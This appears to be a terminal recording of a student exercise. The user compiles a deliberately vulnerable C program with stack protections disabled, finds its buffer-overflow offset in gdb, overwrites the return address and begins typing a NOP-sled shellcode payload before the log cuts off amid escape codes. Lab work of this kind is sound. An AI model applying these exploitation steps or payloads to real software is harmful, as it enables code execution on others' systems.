Script started on Fri 31 Mar 2017 04:58:43 AM EDT
]0;hprakash@hprakash-Linux: ~/Desktop/intel/x64/Assignment[01;32mhprakash@hprakash-Linux[00m:[01;34m~/Desktop/intel/x64/Assignment[00m$ gcc -fno-stack-protector -z execstack vuln.c 
 -o vuln
[01m[Kvuln.c:[m[K In function â€˜[01m[Kdumb[m[Kâ€™:
[01m[Kvuln.c:17:7:[m[K [01;35m[Kwarning: [m[Kassignment from incompatible pointer type [-Wincompatible-pointer-types]
   hold=(int *)&test;
[01;32m[K       ^[m[K
[01m[Kvuln.c:19:10:[m[K [01;35m[Kwarning: [m[Kformat â€˜[01m[K%x[m[Kâ€™ expects argument of type â€˜[01m[Kunsigned int[m[Kâ€™, but argument 2 has type â€˜[01m[Klong long unsigned int[m[Kâ€™ [-Wformat=]
   printf("\n\nValue of Test:%x",(unsigned long long)&test);
[01;32m[K          ^[m[K
[01m[Kvuln.c:20:10:[m[K [01;35m[Kwarning: [m[Kformat â€˜[01m[K%x[m[Kâ€™ expects argument of type â€˜[01m[Kunsigned int[m[Kâ€™, but argument 2 has type â€˜[01m[Klong long unsigned int[m[Kâ€™ [-Wformat=]
   printf("\nValue of filename[0]:%x\n",(unsigned long long)filename);
[01;32m[K          ^[m[K
[01m[Kvuln.c:[m[K In function â€˜[01m[Kmain[m[Kâ€™:
[01m[Kvuln.c:36:14:[m[K [01;35m[Kwarning: [m[Kformat â€˜[01m[K%d[m[Kâ€™ expects argument of type â€˜[01m[Kint[m[Kâ€™, but argument 2 has type â€˜[01m[Ksize_t {aka long unsigned int}[m[Kâ€™ [-Wformat=]
       printf("\nLength of Input String:%d\n", strlen(string));
[01;32m[K              ^[m[K
]0;hprakash@hprakash-Linux: ~/Desktop/intel/x64/Assignment[01;32mhprakash@hprakash-Linux[00m:[01;34m~/Desktop/intel/x64/Assignment[00m$ gdb vuln
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.04) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from vuln...(no debugging symbols found)...done.
(gdb) disass main
Dump of assembler code for function main:
   0x000000000040068a <+0>:	push   %rbp
   0x000000000040068b <+1>:	mov    %rsp,%rbp
   0x000000000040068e <+4>:	sub    $0x2730,%rsp
   0x0000000000400695 <+11>:	mov    %edi,-0x2724(%rbp)
   0x000000000040069b <+17>:	mov    %rsi,-0x2730(%rbp)
   0x00000000004006a2 <+24>:	mov    -0x2730(%rbp),%rax
   0x00000000004006a9 <+31>:	mov    0x8(%rax),%rax
   0x00000000004006ad <+35>:	mov    %rax,-0x8(%rbp)
   0x00000000004006b1 <+39>:	callq  0x4005f6 <get_sp>
   0x00000000004006b6 <+44>:	mov    %rax,-0x10(%rbp)
   0x00000000004006ba <+48>:	cmpl   $0x1,-0x2724(%rbp)
   0x00000000004006c1 <+55>:	jle    0x4006f9 <main+111>
   0x00000000004006c3 <+57>:	mov    -0x8(%rbp),%rax
   0x00000000004006c7 <+61>:	mov    %rax,%rdi
   0x00000000004006ca <+64>:	callq  0x4004c0 <strlen@plt>
   0x00000000004006cf <+69>:	mov    %rax,%rsi
   0x00000000004006d2 <+72>:	mov    $0x400812,%edi
   0x00000000004006d7 <+77>:	mov    $0x0,%eax
   0x00000000004006dc <+82>:	callq  0x4004d0 <printf@plt>
   0x00000000004006e1 <+87>:	mov    -0x2730(%rbp),%rax
   0x00000000004006e8 <+94>:	add    $0x8,%rax
   0x00000000004006ec <+98>:	mov    (%rax),%rax
   0x00000000004006ef <+101>:	mov    %rax,%rdi
   0x00000000004006f2 <+104>:	callq  0x400600 <dumb>
   0x00000000004006f7 <+109>:	jmp    0x40070d <main+131>
   0x00000000004006f9 <+111>:	mov    $0x400830,%edi
   0x00000000004006fe <+116>:	callq  0x4004b0 <puts@plt>
   0x0000000000400703 <+121>:	mov    $0x400861,%edi
---Type <return> to continue, or q <return> to quit---
   0x0000000000400708 <+126>:	callq  0x400600 <dumb>
   0x000000000040070d <+131>:	mov    $0x0,%eax
   0x0000000000400712 <+136>:	leaveq 
   0x0000000000400713 <+137>:	retq   
End of assembler dump.
(gdb) disass dumb
Dump of assembler code for function dumb:
   0x0000000000400600 <+0>:	push   %rbp
   0x0000000000400601 <+1>:	mov    %rsp,%rbp
   0x0000000000400604 <+4>:	sub    $0x420,%rsp
   0x000000000040060b <+11>:	mov    %rdi,-0x418(%rbp)
   0x0000000000400612 <+18>:	lea    -0x8(%rbp),%rax
   0x0000000000400616 <+22>:	mov    %rax,0x200a3b(%rip)        # 0x601058 <hold>
   0x000000000040061d <+29>:	lea    -0x8(%rbp),%rax
   0x0000000000400621 <+33>:	mov    %rax,%rsi
   0x0000000000400624 <+36>:	mov    $0x4007a8,%edi
   0x0000000000400629 <+41>:	mov    $0x0,%eax
   0x000000000040062e <+46>:	callq  0x4004d0 <printf@plt>
   0x0000000000400633 <+51>:	lea    -0x410(%rbp),%rax
   0x000000000040063a <+58>:	mov    %rax,%rsi
   0x000000000040063d <+61>:	mov    $0x4007bb,%edi
   0x0000000000400642 <+66>:	mov    $0x0,%eax
   0x0000000000400647 <+71>:	callq  0x4004d0 <printf@plt>
   0x000000000040064c <+76>:	lea    -0x8(%rbp),%rdx
   0x0000000000400650 <+80>:	lea    -0x410(%rbp),%rax
   0x0000000000400657 <+87>:	sub    %rax,%rdx
   0x000000000040065a <+90>:	mov    %rdx,%rax
   0x000000000040065d <+93>:	mov    %eax,%esi
   0x000000000040065f <+95>:	mov    $0x4007d8,%edi
   0x0000000000400664 <+100>:	mov    $0x0,%eax
   0x0000000000400669 <+105>:	callq  0x4004d0 <printf@plt>
   0x000000000040066e <+110>:	mov    -0x418(%rbp),%rdx
   0x0000000000400675 <+117>:	lea    -0x410(%rbp),%rax
   0x000000000040067c <+124>:	mov    %rdx,%rsi
   0x000000000040067f <+127>:	mov    %rax,%rdi
---Type <return> to continue, or q <return> to quit---
   0x0000000000400682 <+130>:	callq  0x4004a0 <strcpy@plt>
   0x0000000000400687 <+135>:	nop
   0x0000000000400688 <+136>:	leaveq 
   0x0000000000400689 <+137>:	retq   
End of assembler dump.
(gdb) b *0x0000000000400669
Breakpoint 1 at 0x400669
(gdb) run $(python -c "print [K('A'*1032)"
Starting program: /home/hprakash/Desktop/intel/x64/Assignment/vuln $(python -c "print('A'*1032)"
/bin/bash: -c: line 0: unexpected EOF while looking for matching `)'
/bin/bash: -c: line 1: syntax error: unexpected end of file
During startup program exited with code 1.
(gdb) run $(python -c "print('A'*1032)")
Starting program: /home/hprakash/Desktop/intel/x64/Assignment/vuln $(python -c "print('A'*1032)")

Length of Input String:1032


Value of Test:ffffb4c8
Value of filename[0]:ffffb0c0

Breakpoint 1, 0x0000000000400669 in dumb ()
(gdb) info reg
rax            0x0	0
rbx            0x0	0
rcx            0x7fffffe1	2147483617
rdx            0x408	1032
rsi            0x408	1032
rdi            0x4007d8	4196312
rbp            0x7fffffffb4d0	0x7fffffffb4d0
rsp            0x7fffffffb0b0	0x7fffffffb0b0
r8             0x0	0
r9             0x1f	31
r10            0x0	0
r11            0x246	582
r12            0x400500	4195584
r13            0x7fffffffdcf0	140737488346352
r14            0x0	0
r15            0x0	0
rip            0x400669	0x400669 <dumb+105>
eflags         0x202	[ IF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) n
Single stepping until exit from function dumb,
which has no line number information.

You are going to need a buffer a little larger than:1032

0x00000000004006f7 in main ()
(gdb) n
Single stepping until exit from function main,
which has no line number information.
__libc_start_main (main=0x40068a <main>, argc=2, argv=0x7fffffffdcf8, init=<optimized out>, 
    fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffdce8)
    at ../csu/libc-start.c:325
325	../csu/libc-start.c: No such file or directory.
(gdb) n
[Inferior 1 (process 32561) exited normally]
(gdb) ninfo reg
[C[C[C[C[C[Crun $(python -c "print('A'*1032)")[C[1P)")[1P)")4)")0)")
Starting program: /home/hprakash/Desktop/intel/x64/Assignment/vuln $(python -c "print('A'*1040)")

Length of Input String:1040


Value of Test:ffffb4b8
Value of filename[0]:ffffb0b0

Breakpoint 1, 0x0000000000400669 in dumb ()
(gdb) info reg
rax            0x0	0
rbx            0x0	0
rcx            0x7fffffe1	2147483617
rdx            0x408	1032
rsi            0x408	1032
rdi            0x4007d8	4196312
rbp            0x7fffffffb4c0	0x7fffffffb4c0
rsp            0x7fffffffb0a0	0x7fffffffb0a0
r8             0x0	0
r9             0x1f	31
r10            0x0	0
r11            0x246	582
r12            0x400500	4195584
r13            0x7fffffffdce0	140737488346336
r14            0x0	0
r15            0x0	0
rip            0x400669	0x400669 <dumb+105>
eflags         0x202	[ IF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) n
Single stepping until exit from function dumb,
which has no line number information.

You are going to need a buffer a little larger than:1032

0x00000000004006f7 in main ()
(gdb) n
Single stepping until exit from function main,
which has no line number information.
__libc_start_main (main=0x40068a <main>, argc=2, argv=0x7fffffffdce8, init=<optimized out>, 
    fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffdcd8)
    at ../csu/libc-start.c:325
325	../csu/libc-start.c: No such file or directory.
(gdb) n
[Inferior 1 (process 32574) exited normally]
(gdb) ninfo reg
[C[C[C[C[C[Crun $(python -c "print('A'*1040)")[1P)")[1P)")5)")0)")
Starting program: /home/hprakash/Desktop/intel/x64/Assignment/vuln $(python -c "print('A'*1050)")

Length of Input String:1050


Value of Test:ffffb4b8
Value of filename[0]:ffffb0b0

Breakpoint 1, 0x0000000000400669 in dumb ()
(gdb) info reg
rax            0x0	0
rbx            0x0	0
rcx            0x7fffffe1	2147483617
rdx            0x408	1032
rsi            0x408	1032
rdi            0x4007d8	4196312
rbp            0x7fffffffb4c0	0x7fffffffb4c0
rsp            0x7fffffffb0a0	0x7fffffffb0a0
r8             0x0	0
r9             0x1f	31
r10            0x0	0
r11            0x246	582
r12            0x400500	4195584
r13            0x7fffffffdce0	140737488346336
r14            0x0	0
r15            0x0	0
rip            0x400669	0x400669 <dumb+105>
eflags         0x202	[ IF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) n
Single stepping until exit from function dumb,
which has no line number information.

You are going to need a buffer a little larger than:1032

0x0000000000004141 in ?? ()
(gdb) info reg
rax            0x7fffffffb0b0	140737488335024
rbx            0x0	0
rcx            0x4141414141414141	4702111234474983745
rdx            0x41414141414141	18367622009667905
rsi            0x7fffffffe420	140737488348192
rdi            0x7fffffffb4bd	140737488336061
rbp            0x4141414141414141	0x4141414141414141
rsp            0x7fffffffb4d0	0x7fffffffb4d0
r8             0x0	0
r9             0x3b	59
r10            0x5d	93
r11            0x7ffff7b95128	140737349505320
r12            0x400500	4195584
r13            0x7fffffffdce0	140737488346336
r14            0x0	0
r15            0x0	0
rip            0x4141	0x4141
eflags         0x206	[ PF IF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) x/1060xb ($rsp-1060)
0x7fffffffb0ac:	0xff	0x7f	0x00	0x00	0x41	0x41	0x41	0x41
0x7fffffffb0b4:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb0bc:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb0c4:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb0cc:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb0d4:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb0dc:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb0e4:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb0ec:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb0f4:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb0fc:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb104:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb10c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb114:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb11c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb124:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb12c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb134:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb13c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb144:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb14c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb154:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb15c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb164:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb16c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb174:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb17c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb184:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb18c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
---Type <return> to continue, or q <return> to quit---
0x7fffffffb194:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb19c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb1a4:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb1ac:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb1b4:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb1bc:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb1c4:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb1cc:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb1d4:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb1dc:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb1e4:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb1ec:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb1f4:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb1fc:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb204:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb20c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb214:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb21c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb224:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb22c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb234:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb23c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb244:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb24c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb254:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb25c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb264:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb26c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb274:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
---Type <return> to continue, or q <return> to quit---
0x7fffffffb27c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb284:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb28c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb294:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb29c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb2a4:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb2ac:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb2b4:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb2bc:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb2c4:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb2cc:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb2d4:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb2dc:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb2e4:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb2ec:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb2f4:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb2fc:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb304:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb30c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb314:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb31c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb324:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb32c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb334:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb33c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb344:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb34c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb354:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb35c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
---Type <return> to continue, or q <return> to quit---
0x7fffffffb364:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb36c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb374:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb37c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb384:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb38c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb394:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb39c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb3a4:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb3ac:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb3b4:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb3bc:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb3c4:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb3cc:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb3d4:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb3dc:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb3e4:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb3ec:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb3f4:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb3fc:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb404:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb40c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb414:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb41c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb424:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb42c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb434:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb43c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb444:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
---Type <return> to continue, or q <return> to quit---
0x7fffffffb44c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb454:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb45c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb464:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb46c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb474:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb47c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb484:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb48c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb494:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb49c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb4a4:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb4ac:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb4b4:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb4bc:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffb4c4:	0x41	0x41	0x41	0x41	0x41	0x41	0x00	0x00
0x7fffffffb4cc:	0x00	0x00	0x00	0x00
(gdb) x/1060xb ($rsp-1060)
[C[C[C[C[C[C[12Pinfo reg
[C[C[C[C[C[Cn[Kinfo reg
[C[C[C[C[C[Crun $(python -c "print('A'*1050)")[1P)")2)")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/hprakash/Desktop/intel/x64/Assignment/vuln $(python -c "print('A'*1052)")

Length of Input String:1052


Value of Test:ffffb4b8
Value of filename[0]:ffffb0b0

Breakpoint 1, 0x0000000000400669 in dumb ()
(gdb) n
Single stepping until exit from function dumb,
which has no line number information.

You are going to need a buffer a little larger than:1032

0x0000000041414141 in ?? ()
(gdb) info reg
rax            0x7fffffffb0b0	140737488335024
rbx            0x0	0
rcx            0x4141414141414141	4702111234474983745
rdx            0x41414141414141	18367622009667905
rsi            0x7fffffffe420	140737488348192
rdi            0x7fffffffb4bf	140737488336063
rbp            0x4141414141414141	0x4141414141414141
rsp            0x7fffffffb4d0	0x7fffffffb4d0
r8             0x0	0
r9             0x3b	59
r10            0x5d	93
r11            0x7ffff7b95128	140737349505320
r12            0x400500	4195584
r13            0x7fffffffdce0	140737488346336
r14            0x0	0
r15            0x0	0
rip            0x41414141	0x41414141
eflags         0x202	[ IF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) info reg
[C[C[C[C[C[Cn[Krun $(python -c "print('A'*1052)")[1P)")[1P)")4)")8)")+)")')")B)")B)")B)")B)")')")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/hprakash/Desktop/intel/x64/Assignment/vuln $(python -c "print('A'*1048+'BBBB')")

Length of Input String:1052


Value of Test:ffffb4b8
Value of filename[0]:ffffb0b0

Breakpoint 1, 0x0000000000400669 in dumb ()
(gdb) n
Single stepping until exit from function dumb,
which has no line number information.

You are going to need a buffer a little larger than:1032

0x0000000042424242 in ?? ()
(gdb) n
Cannot find bounds of current function
(gdb) nrun $(python -c "print('A'*1048+'BBBB')")[1P+'BBBB')")[1P+'BBBB')")0+'BBBB')")0+'BBBB')")[1P'*1000+'BBBB')")\'*1000+'BBBB')")x'*1000+'BBBB')")9'*1000+'BBBB')")0'*1000+'BBBB')")[C[C[C[C[C[C[C\'BBBB')")x'BBBB')")e'BBBB')")b'BBBB')")\'BBBB')")x'BBBB')")1'BBBB')")3'BBBB')")\'BBBB')")x'BBBB')")5'BBBB')")f'BBBB')")\'BBBB')")x'BBBB')")4'BBBB')")8'BBBB')")\'BBBB')")x'BBBB')")3'BBBB')")1'BBBB')")\'BBBB')")x'BBBB')")c'BBBB')")0'BBBB')")\'BBBB')")x'BBBB')")8'BBBB')")8'BBBB')")\'BBBB')")x'BBBB')")4'BBBB')")7'BBBB')")\'BBBB')")x'BBBB')")0'BBBB')")7'BBBB')")\'BBBB')")x'BBBB')")5'BBBB')")0'BBBB')")\'BBBB')")x'BBBB')")4'BBBB')")8'BBBB')")\'BBBB')")x'BBBB')")8'BBBB')")9'BBBB')")\'BBBB')")x'BBBB')") [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ce'BBBB')")
)[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C2'BBBB')")[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C\'BBBB')")[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cx'BBBB')")[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C5'BBBB')")[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C7'BBBB')")[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C\'BB[CB')")[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cx'B[C[CB')")[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C